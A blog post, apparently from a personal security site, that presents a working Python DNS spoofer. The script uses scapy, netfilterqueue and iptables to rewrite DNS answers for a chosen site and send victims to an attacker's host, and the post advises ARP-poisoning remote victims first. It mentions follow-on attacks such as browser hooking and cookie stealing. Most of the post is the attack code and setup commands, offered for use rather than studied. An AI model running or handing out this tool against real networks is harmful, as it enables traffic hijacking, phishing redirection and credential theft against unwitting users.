---
title: DNS Spoofer
date: 2021-06-28 10:45:47 +07:00
categories: python
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Poison DNS responses.
---

<p align="left">
 <img src="https://external-preview.redd.it/SRVKUe2MGSCBVB56FwBzwFZE6uxGaNZ_Vknx5vioVAw.png?auto=webp&s=b21e5b8bde6eed10e5ef54a188ebf0840e0bf8b4">
</p>



## This is a python script that poisons all DNS responses flowing though the host machine to successfully spoof a target site and redirect the victim to a malicious site of chosing.

- We use IPTABLES to build a queue to intercept traffic. Based on INPUT(inboud traffic),OUTPUT(outbound traffic) and FORWARD(traffic from remote hosts).
The program automatically runs these commands, if it dosen't work for some reason, run the following commands to build a queue alongside when running the program -

> `iptables -I INPUT -j NFQUEUE --queue-num 0` --> Intercept Queue for inbound traffic

> `iptables -I OUTPUT -j NFQUEUE --queue-num 0` --> Intercept Queue for outbound traffic

> `iptables --flush` --> flush rules after completion

- We filter the traffic like an intercepting proxy would to filter and modify DNS responses for the target site to redirect the victim to a malicious site of the attackers choosing. Many avenues of attacks can be performed like browser hooking, cookie stealing etc.

- To spoof a remote victim replace the 2nd iptables command, ARP Poison the victim to redirect all DNS traffic through our host machine and proceed as above:

> `iptables -I FORWARD -j NFQUEUE --queue-num 0` -->  Intercept Queue for inbound traffic

### CODE:

```python
#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import subprocess
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--redirect-host", dest="host", help="Redirect DNS requests to this Site/Host")
    parser.add_argument("-s", "--site", dest="site", help="Target Site to DNS Spoof")
    options = parser.parse_args()
    if not options.host:
        # code to handle error
        parser.error("\n[-] Please specify a valid Host,  use --help for info.")
    if not options.site:
        # code to handle error
        parser.error("\n[-] Please specify a valid site to spoof,  use --help for info.")
    return options

# Use get_payload() method to view fields for netfilterqueue objects
def process_packet(packet):
    # Cloning and converting to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSQR - DNS request / DNSRR - DNS request
    if scapy_packet.haslayer(scapy.DNSRR):
        # Filter Question Record for site name
        qname = scapy_packet[scapy.DNSQR].qname
        if options.site in qname:
            print("[+] Spoofing target: " + options.site)
            # Create DNS response
            answer = scapy.DNSRR(rrname=qname, rdata=options.host)
            scapy_packet[scapy.DNS].an = answer
            # Setting no of DNS responses
            scapy_packet[scapy.DNS].ancount = 1
            # Remove these fields and let Scapy recalculate them automatically
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            # Copying modified attributes to the original packet
            packet.set_payload(str(scapy_packet))
    # Forward packet to target
    packet.accept()

def iptables_set(queue_num):
    # os cmds to change add IPTABLES to setup a queue with queue-num 0
    subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    print("[!] IPTABLE rules set succesfully! \n")

def iptables_reset():
    # os cmds to change add IPTABLES to setup a queue with queue-num 0
    subprocess.call(["sudo", "iptables", "--flush"])
    print("[!] IPTABLE rules reset succesfully! \n")


print("""
___  _  _ ____    ____ ___  ____ ____ ____ ____ ____ 
|  \ |\ | [__     [__  |__] |  | |  | |___ |___ |__/ 
|__/ | \| ___]    ___] |    |__| |__| |    |___ |  \ 
                                                                                                                                                                                           
      """)

try:
    options = get_arguments()
    print("[-] [NOTE:] To sniff a target remote system, ARP Poison the target's cache to allow all DNS requests to flow through this machine\n\n")
    queue_num = input("[!] Setup IPTABLES rules with a queue number.\n - Enter a queue number: ")
    print("\n\n******************************************************************************************")
    print("[+] Spoofing all DNS traffic flowing through this machine using configured IPTABLE queues.")
    print("******************************************************************************************\n\n")
    # Creating instance of netfilterqueue obj
    queue = netfilterqueue.NetfilterQueue()
    # Bind to created queue using iptables; process_packet-->callback()
    queue.bind(queue_num, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ......\n")
    iptables_reset()
```

### OUTPUT:

__Attacker:__

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/DnsSpoofer/arpspoof1.png)

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/DnsSpoofer/dnspoof1.png)

__Victim:__

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/DnsSpoofer/dnspoof2.png)

